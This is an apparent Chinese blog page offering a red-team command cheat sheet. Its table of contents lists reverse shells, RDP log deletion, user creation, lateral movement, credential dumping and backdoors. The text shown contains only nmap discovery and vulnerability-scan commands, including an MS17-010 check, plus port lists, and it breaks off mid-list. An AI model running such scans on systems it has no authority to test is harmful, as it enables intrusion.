

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/bg/icon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="William Tao">
  <meta name="keywords" content="websafe">
  
    <meta name="description" content="command收集渗透中会用到的常用命令  。 更新时间：2022.2.27 Table of Contents  command nmap 存活主机 bypass gobuster dirsearch nbtscan 代理工具 ssh grep mysql sqlmap hydra medusa python交互shell 无交互添加用户 windows   防火墙 frp常用配置 删rdp日志">
<meta property="og:type" content="article">
<meta property="og:title" content="红队命令速查">
<meta property="og:url" content="http://example.com/2022/04/10/%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/index.html">
<meta property="og:site_name" content="taoke-one 博客">
<meta property="og:description" content="command收集渗透中会用到的常用命令  。 更新时间：2022.2.27 Table of Contents  command nmap 存活主机 bypass gobuster dirsearch nbtscan 代理工具 ssh grep mysql sqlmap hydra medusa python交互shell 无交互添加用户 windows   防火墙 frp常用配置 删rdp日志">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-04-10T14:52:11.000Z">
<meta property="article:modified_time" content="2022-04-10T14:54:19.721Z">
<meta property="article:author" content="William Tao">
<meta property="article:tag" content="websafe">
<meta name="twitter:card" content="summary_large_image">
  
  
  <title>红队命令速查 - taoke-one 博客</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>导航</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="红队命令速查">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-04-10 22:52" pubdate>
        2022年4月10日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      52k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      434 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">红队命令速查</h1>
            
            <div class="markdown-body">
              <h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><p>收集渗透中会用到的常用命令  。</p>
<p>更新时间：2022.2.27</p>
<p>Table of Contents</p>
<ul>
<li><a href="#command">command</a><ul>
<li><a href="#nmap">nmap</a></li>
<li><a href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">存活主机</a></li>
<li><a href="#bypass">bypass</a></li>
<li><a href="#gobuster">gobuster</a></li>
<li><a href="#dirsearch">dirsearch</a></li>
<li><a href="#nbtscan">nbtscan</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7">代理工具</a></li>
<li><a href="#ssh">ssh</a></li>
<li><a href="#grep">grep</a></li>
<li><a href="#mysql">mysql</a></li>
<li><a href="#sqlmap">sqlmap</a></li>
<li><a href="#hydra">hydra</a></li>
<li><a href="#medusa">medusa</a></li>
<li><a href="#python%E4%BA%A4%E4%BA%92shell">python交互shell</a></li>
<li><a href="#%E6%97%A0%E4%BA%A4%E4%BA%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7">无交互添加用户</a><ul>
<li><a href="#windows">windows</a></li>
</ul>
</li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></li>
<li><a href="#frp%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE">frp常用配置</a></li>
<li><a href="#%E5%88%A0rdp%E6%97%A5%E5%BF%97">删rdp日志</a></li>
<li><a href="#%E5%BC%803389">开3389</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE">文件查找</a></li>
<li><a href="#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">powershell文件下载</a></li>
<li><a href="#certutilexe%E4%B8%8B%E8%BD%BD">certutil.exe下载</a></li>
<li><a href="#bitsadmin">bitsadmin</a></li>
<li><a href="#windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">windows信息收集常用命令</a></li>
<li><a href="#atschtaskssc%E6%A8%AA%E5%90%91">at&amp;schtasks&amp;sc横向</a></li>
<li><a href="#impacket%E5%8C%85%E6%A8%AA%E5%90%91%E5%91%BD%E4%BB%A4">impacket包横向命令</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
<li><a href="#nc">nc</a></li>
<li><a href="#bash">bash</a></li>
<li><a href="#perl">perl</a></li>
<li><a href="#python">python</a></li>
<li><a href="#php">php</a></li>
<li><a href="#ruby">ruby</a></li>
<li><a href="#nc-1">nc</a></li>
<li><a href="#java">java</a></li>
<li><a href="#lua">lua</a></li>
<li><a href="#powershell">powershell</a></li>
<li><a href="#%E5%8A%A0%E5%AF%86shell">加密shell</a></li>
</ul>
</li>
<li><a href="#msf%E5%A4%A7%E5%85%A8">msf大全</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
<li><a href="#meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4">Meterpreter基本命令</a><ul>
<li><a href="#%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">基本系统命令</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">文件系统命令</a></li>
<li><a href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4">网络命令</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81">获取凭证</a></li>
<li><a href="#%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C">假冒令牌</a></li>
<li><a href="#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">植入后门</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#cs%E5%A4%A7%E5%85%A8">cs大全</a></li>
</ul>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">10.11.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -p- <span class="hljs-number">10.11.1.0</span><br></code></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.11.1.0</span> --script vuln<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p445 <span class="hljs-number">10.11.1.0</span> --script smb-vuln-ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> -v -<span class="hljs-keyword">sn</span> -PE -n --<span class="hljs-built_in">min</span>-hostgroup <span class="hljs-number">1024</span> --<span class="hljs-built_in">min</span>-parallelism <span class="hljs-number">1024</span> -oG tmp -iL ip.txt | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;latency).&quot;</span> &gt;ok_ip.txt<br></code></pre></td></tr></table></figure>

<h2 id="端口列表"><a href="#端口列表" class="headerlink" title="端口列表"></a>端口列表</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">135</span>,<span class="hljs-number">445</span>,<span class="hljs-number">389</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">27017</span>,<span class="hljs-number">2375</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">5432</span>,<span class="hljs-number">4899</span><br><br><span class="hljs-attribute">21</span>-<span class="hljs-number">23</span>,<span class="hljs-number">80</span>-<span class="hljs-number">90</span>,<span class="hljs-number">135</span>,<span class="hljs-number">137</span>,<span class="hljs-number">161</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">873</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">1900</span>,<span class="hljs-number">2082</span>,<span class="hljs-number">2083</span>,<span class="hljs-number">2222</span>,<span class="hljs-number">2375</span>,<span class="hljs-number">2376</span>,<span class="hljs-number">2601</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3311</span>,<span class="hljs-number">3312</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">4440</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">5001</span>,<span class="hljs-number">5432</span>,<span class="hljs-number">5560</span>,<span class="hljs-number">5900</span>-<span class="hljs-number">5902</span>,<span class="hljs-number">6082</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">7001</span>-<span class="hljs-number">7010</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">8009</span>,<span class="hljs-number">8080</span>-<span class="hljs-number">8090</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">10000</span>,<span class="hljs-number">11211</span>,<span class="hljs-number">27017</span>,<span class="hljs-number">28017</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">51111</span>,<span class="hljs-number">50030</span>,<span class="hljs-number">50060</span><br><br><span class="hljs-attribute">20</span>-<span class="hljs-number">26</span>,<span class="hljs-number">30</span>,<span class="hljs-number">32</span>-<span class="hljs-number">33</span>,<span class="hljs-number">37</span>,<span class="hljs-number">42</span>-<span class="hljs-number">43</span>,<span class="hljs-number">49</span>,<span class="hljs-number">53</span>,<span class="hljs-number">70</span>,<span class="hljs-number">79</span>-<span class="hljs-number">85</span>,<span class="hljs-number">88</span>-<span class="hljs-number">90</span>,<span class="hljs-number">99</span>-<span class="hljs-number">100</span>,<span class="hljs-number">106</span>,<span class="hljs-number">109</span>-<span class="hljs-number">111</span>,<span class="hljs-number">113</span>,<span class="hljs-number">119</span>,<span class="hljs-number">125</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">143</span>-<span class="hljs-number">144</span>,<span class="hljs-number">146</span>,<span class="hljs-number">161</span>,<span class="hljs-number">163</span>,<span class="hljs-number">179</span>,<span class="hljs-number">199</span>,<span class="hljs-number">211</span>-<span class="hljs-number">212</span>,<span class="hljs-number">222</span>,<span class="hljs-number">254</span>-<span class="hljs-number">256</span>,<span class="hljs-number">259</span>,<span class="hljs-number">264</span>,<span class="hljs-number">280</span>,<span class="hljs-number">301</span>,<span class="hljs-number">306</span>,<span class="hljs-number">311</span>,<span class="hljs-number">340</span>,<span class="hljs-number">366</span>,<span class="hljs-number">389</span>,<span class="hljs-number">406</span>-<span class="hljs-number">407</span>,<span class="hljs-number">416</span>-<span class="hljs-number">417</span>,<span class="hljs-number">425</span>,<span class="hljs-number">427</span>,<span class="hljs-number">443</span>-<span class="hljs-number">445</span>,<span class="hljs-number">458</span>,<span class="hljs-number">464</span>-<span class="hljs-number">465</span>,<span class="hljs-number">481</span>,<span class="hljs-number">497</span>,<span class="hljs-number">500</span>,<span class="hljs-number">512</span>-<span class="hljs-number">515</span>,<span class="hljs-number">524</span>,<span class="hljs-number">541</span>,<span class="hljs-number">543</span>-<span class="hljs-number">545</span>,<span class="hljs-number">548</span>,<span class="hljs-number">554</span>-<span class="hljs-number">555</span>,<span class="hljs-number">563</span>,<span class="hljs-number">587</span>,<span class="hljs-number">593</span>,<span class="hljs-number">616</span>-<span class="hljs-number">617</span>,<span class="hljs-number">625</span>,<span class="hljs-number">631</span>,<span class="hljs-number">636</span>,<span class="hljs-number">646</span>,<span class="hljs-number">648</span>,<span class="hljs-number">666</span>-<span class="hljs-number">668</span>,<span class="hljs-number">683</span>,<span class="hljs-number">687</span>,<span class="hljs-number">691</span>,<span class="hljs-number">700</span>,<span class="hljs-number">705</span>,<span class="hljs-number">711</span>,<span class="hljs-number">714</span>,<span class="hljs-number">720</span>,<span class="hljs-number">722</span>,<span class="hljs-number">726</span>,<span class="hljs-number">749</span>,<span class="hljs-number">765</span>,<span class="hljs-number">777</span>,<span class="hljs-number">783</span>,<span class="hljs-number">787</span>,<span class="hljs-number">800</span>-<span class="hljs-number">801</span>,<span class="hljs-number">808</span>,<span class="hljs-number">843</span>,<span class="hljs-number">873</span>,<span class="hljs-number">880</span>,<span class="hljs-number">888</span>,<span class="hljs-number">898</span>,<span class="hljs-number">900</span>-<span class="hljs-number">903</span>,<span class="hljs-number">911</span>-<span class="hljs-number">912</span>,<span class="hljs-number">981</span>,<span class="hljs-number">987</span>,<span class="hljs-number">990</span>,<span class="hljs-number">992</span>-<span class="hljs-number">993</span>,<span class="hljs-number">995</span>,<span class="hljs-number">999</span>-<span class="hljs-number">1002</span>,<span class="hljs-number">1007</span>,<span class="hljs-number">1009</span>-<span class="hljs-number">1011</span>,<span class="hljs-number">1021</span>-<span class="hljs-number">1100</span>,<span class="hljs-number">1102</span>,<span class="hljs-number">1104</span>-<span class="hljs-number">1108</span>,<span class="hljs-number">1110</span>-<span class="hljs-number">1114</span>,<span class="hljs-number">1117</span>,<span class="hljs-number">1119</span>,<span class="hljs-number">1121</span>-<span class="hljs-number">1124</span>,<span class="hljs-number">1126</span>,<span class="hljs-number">1130</span>-<span class="hljs-number">1132</span>,<span class="hljs-number">1137</span>-<span class="hljs-number">1138</span>,<span class="hljs-number">1141</span>,<span class="hljs-number">1145</span>,<span class="hljs-number">1147</span>-<span class="hljs-number">1149</span>,<span class="hljs-number">1151</span>-<span class="hljs-number">1152</span>,<span class="hljs-number">1154</span>,<span class="hljs-number">1163</span>-<span class="hljs-number">1166</span>,<span class="hljs-number">1169</span>,<span class="hljs-number">1174</span>-<span class="hljs-number">1175</span>,<span class="hljs-number">1183</span>,<span class="hljs-number">1185</span>-<span class="hljs-number">1187</span>,<span class="hljs-number">1192</span>,<span class="hljs-number">1198</span>-<span class="hljs-number">1199</span>,<span class="hljs-number">1201</span>,<span class="hljs-number">1213</span>,<span class="hljs-number">1216</span>-<span class="hljs-number">1218</span>,<span class="hljs-number">1233</span>-<span class="hljs-number">1234</span>,<span class="hljs-number">1236</span>,<span class="hljs-number">1244</span>,<span class="hljs-number">1247</span>-<span class="hljs-number">1248</span>,<span class="hljs-number">1259</span>,<span class="hljs-number">1271</span>-<span class="hljs-number">1272</span>,<span class="hljs-number">1277</span>,<span class="hljs-number">1287</span>,<span class="hljs-number">1296</span>,<span class="hljs-number">1300</span>-<span class="hljs-number">1301</span>,<span class="hljs-number">1309</span>-<span class="hljs-number">1311</span>,<span class="hljs-number">1322</span>,<span class="hljs-number">1328</span>,<span class="hljs-number">1334</span>,<span class="hljs-number">1352</span>,<span class="hljs-number">1417</span>,<span class="hljs-number">1433</span>-<span class="hljs-number">1434</span>,<span class="hljs-number">1443</span>,<span class="hljs-number">1455</span>,<span class="hljs-number">1461</span>,<span class="hljs-number">1494</span>,<span class="hljs-number">1500</span>-<span class="hljs-number">1501</span>,<span class="hljs-number">1503</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">1524</span>,<span class="hljs-number">1533</span>,<span class="hljs-number">1556</span>,<span class="hljs-number">1580</span>,<span class="hljs-number">1583</span>,<span class="hljs-number">1594</span>,<span class="hljs-number">1600</span>,<span class="hljs-number">1641</span>,<span class="hljs-number">1658</span>,<span class="hljs-number">1666</span>,<span class="hljs-number">1687</span>-<span class="hljs-number">1688</span>,<span class="hljs-number">1700</span>,<span class="hljs-number">1717</span>-<span class="hljs-number">1721</span>,<span class="hljs-number">1723</span>,<span class="hljs-number">1755</span>,<span class="hljs-number">1761</span>,<span class="hljs-number">1782</span>-<span class="hljs-number">1783</span>,<span class="hljs-number">1801</span>,<span class="hljs-number">1805</span>,<span class="hljs-number">1812</span>,<span class="hljs-number">1839</span>-<span class="hljs-number">1840</span>,<span class="hljs-number">1862</span>-<span class="hljs-number">1864</span>,<span class="hljs-number">1875</span>,<span class="hljs-number">1900</span>,<span class="hljs-number">1914</span>,<span class="hljs-number">1935</span>,<span class="hljs-number">1947</span>,<span class="hljs-number">1971</span>-<span class="hljs-number">1972</span>,<span class="hljs-number">1974</span>,<span class="hljs-number">1984</span>,<span class="hljs-number">1998</span>-<span class="hljs-number">2010</span>,<span class="hljs-number">2013</span>,<span class="hljs-number">2020</span>-<span class="hljs-number">2022</span>,<span class="hljs-number">2030</span>,<span class="hljs-number">2033</span>-<span class="hljs-number">2035</span>,<span class="hljs-number">2038</span>,<span class="hljs-number">2040</span>-<span class="hljs-number">2043</span>,<span class="hljs-number">2045</span>-<span class="hljs-number">2049</span>,<span class="hljs-number">2065</span>,<span class="hljs-number">2068</span>,<span class="hljs-number">2099</span>-<span class="hljs-number">2100</span>,<span class="hljs-number">2103</span>,<span class="hljs-number">2105</span>-<span class="hljs-number">2107</span>,<span class="hljs-number">2111</span>,<span class="hljs-number">2119</span>,<span class="hljs-number">2121</span>,<span class="hljs-number">2126</span>,<span class="hljs-number">2135</span>,<span class="hljs-number">2144</span>,<span class="hljs-number">2160</span>-<span class="hljs-number">2161</span>,<span class="hljs-number">2170</span>,<span class="hljs-number">2179</span>,<span class="hljs-number">2190</span>-<span class="hljs-number">2191</span>,<span class="hljs-number">2196</span>,<span class="hljs-number">2200</span>,<span class="hljs-number">2222</span>,<span class="hljs-number">2251</span>,<span class="hljs-number">2260</span>,<span class="hljs-number">2288</span>,<span class="hljs-number">2301</span>,<span class="hljs-number">2323</span>,<span class="hljs-number">2366</span>,<span class="hljs-number">2381</span>-<span class="hljs-number">2383</span>,<span class="hljs-number">2393</span>-<span class="hljs-number">2394</span>,<span class="hljs-number">2399</span>,<span class="hljs-number">2401</span>,<span class="hljs-number">2492</span>,<span class="hljs-number">2500</span>,<span class="hljs-number">2522</span>,<span class="hljs-number">2525</span>,<span class="hljs-number">2557</span>,<span class="hljs-number">2601</span>-<span class="hljs-number">2602</span>,<span class="hljs-number">2604</span>-<span class="hljs-number">2605</span>,<span class="hljs-number">2607</span>-<span class="hljs-number">2608</span>,<span class="hljs-number">2638</span>,<span class="hljs-number">2701</span>-<span class="hljs-number">2702</span>,<span class="hljs-number">2710</span>,<span class="hljs-number">2717</span>-<span class="hljs-number">2718</span>,<span class="hljs-number">2725</span>,<span class="hljs-number">2800</span>,<span class="hljs-number">2809</span>,<span class="hljs-number">2811</span>,<span class="hljs-number">2869</span>,<span class="hljs-number">2875</span>,<span class="hljs-number">2909</span>-<span class="hljs-number">2910</span>,<span class="hljs-number">2920</span>,<span class="hljs-number">2967</span>-<span class="hljs-number">2968</span>,<span class="hljs-number">2998</span>,<span class="hljs-number">3000</span>-<span class="hljs-number">3001</span>,<span class="hljs-number">3003</span>,<span class="hljs-number">3005</span>-<span class="hljs-number">3007</span>,<span class="hljs-number">3011</span>,<span class="hljs-number">3013</span>,<span class="hljs-number">3017</span>,<span class="hljs-number">3030</span>-<span class="hljs-number">3031</span>,<span class="hljs-number">3052</span>,<span class="hljs-number">3071</span>,<span class="hljs-number">3077</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">3168</span>,<span class="hljs-number">3211</span>,<span class="hljs-number">3221</span>,<span class="hljs-number">3260</span>-<span class="hljs-number">3261</span>,<span class="hljs-number">3268</span>-<span class="hljs-number">3269</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">3300</span>-<span class="hljs-number">3301</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3322</span>-<span class="hljs-number">3325</span>,<span class="hljs-number">3333</span>,<span class="hljs-number">3351</span>,<span class="hljs-number">3367</span>,<span class="hljs-number">3369</span>-<span class="hljs-number">3372</span>,<span class="hljs-number">3389</span>-<span class="hljs-number">3390</span>,<span class="hljs-number">3404</span>,<span class="hljs-number">3476</span>,<span class="hljs-number">3493</span>,<span class="hljs-number">3517</span>,<span class="hljs-number">3527</span>,<span class="hljs-number">3546</span>,<span class="hljs-number">3551</span>,<span class="hljs-number">3580</span>,<span class="hljs-number">3659</span>,<span class="hljs-number">3689</span>-<span class="hljs-number">3690</span>,<span class="hljs-number">3703</span>,<span class="hljs-number">3737</span>,<span class="hljs-number">3766</span>,<span class="hljs-number">3784</span>,<span class="hljs-number">3800</span>-<span class="hljs-number">3801</span>,<span class="hljs-number">3809</span>,<span class="hljs-number">3814</span>,<span class="hljs-number">3826</span>-<span class="hljs-number">3828</span>,<span class="hljs-number">3851</span>,<span class="hljs-number">3869</span>,<span class="hljs-number">3871</span>,<span class="hljs-number">3878</span>,<span class="hljs-number">3880</span>,<span class="hljs-number">3889</span>,<span class="hljs-number">3905</span>,<span class="hljs-number">3914</span>,<span class="hljs-number">3918</span>,<span class="hljs-number">3920</span>,<span class="hljs-number">3945</span>,<span class="hljs-number">3971</span>,<span class="hljs-number">3986</span>,<span class="hljs-number">3995</span>,<span class="hljs-number">3998</span>,<span class="hljs-number">4000</span>-<span class="hljs-number">4006</span>,<span class="hljs-number">4045</span>,<span class="hljs-number">4111</span>,<span class="hljs-number">4125</span>-<span class="hljs-number">4126</span>,<span class="hljs-number">4129</span>,<span class="hljs-number">4224</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">4279</span>,<span class="hljs-number">4321</span>,<span class="hljs-number">4343</span>,<span class="hljs-number">4443</span>-<span class="hljs-number">4446</span>,<span class="hljs-number">4449</span>,<span class="hljs-number">4550</span>,<span class="hljs-number">4567</span>,<span class="hljs-number">4662</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">4899</span>-<span class="hljs-number">4900</span>,<span class="hljs-number">4998</span>,<span class="hljs-number">5000</span>-<span class="hljs-number">5004</span>,<span class="hljs-number">5009</span>,<span class="hljs-number">5030</span>,<span class="hljs-number">5033</span>,<span class="hljs-number">5050</span>-<span class="hljs-number">5051</span>,<span class="hljs-number">5054</span>,<span class="hljs-number">5060</span>-<span class="hljs-number">5061</span>,<span class="hljs-number">5080</span>,<span class="hljs-number">5087</span>,<span class="hljs-number">5100</span>-<span class="hljs-number">5102</span>,<span class="hljs-number">5120</span>,<span class="hljs-number">5190</span>,<span class="hljs-number">5200</span>,<span class="hljs-number">5214</span>,<span class="hljs-number">5221</span>-<span class="hljs-number">5222</span>,<span class="hljs-number">5225</span>-<span class="hljs-number">5226</span>,<span class="hljs-number">5269</span>,<span class="hljs-number">5280</span>,<span class="hljs-number">5298</span>,<span class="hljs-number">5357</span>,<span class="hljs-number">5405</span>,<span class="hljs-number">5414</span>,<span class="hljs-number">5431</span>-<span class="hljs-number">5432</span>,<span class="hljs-number">5440</span>,<span class="hljs-number">5500</span>,<span class="hljs-number">5510</span>,<span class="hljs-number">5544</span>,<span class="hljs-number">5550</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">5560</span>,<span class="hljs-number">5566</span>,<span class="hljs-number">5631</span>,<span class="hljs-number">5633</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">5678</span>-<span class="hljs-number">5679</span>,<span class="hljs-number">5718</span>,<span class="hljs-number">5730</span>,<span class="hljs-number">5800</span>-<span class="hljs-number">5802</span>,<span class="hljs-number">5810</span>-<span class="hljs-number">5811</span>,<span class="hljs-number">5815</span>,<span class="hljs-number">5822</span>,<span class="hljs-number">5825</span>,<span class="hljs-number">5850</span>,<span class="hljs-number">5859</span>,<span class="hljs-number">5862</span>,<span class="hljs-number">5877</span>,<span class="hljs-number">5900</span>-<span class="hljs-number">5904</span>,<span class="hljs-number">5906</span>-<span class="hljs-number">5907</span>,<span class="hljs-number">5910</span>-<span class="hljs-number">5911</span>,<span class="hljs-number">5915</span>,<span class="hljs-number">5922</span>,<span class="hljs-number">5925</span>,<span class="hljs-number">5950</span>,<span class="hljs-number">5952</span>,<span class="hljs-number">5959</span>-<span class="hljs-number">5963</span>,<span class="hljs-number">5987</span>-<span class="hljs-number">5989</span>,<span class="hljs-number">5998</span>-<span class="hljs-number">6007</span>,<span class="hljs-number">6009</span>,<span class="hljs-number">6025</span>,<span class="hljs-number">6059</span>,<span 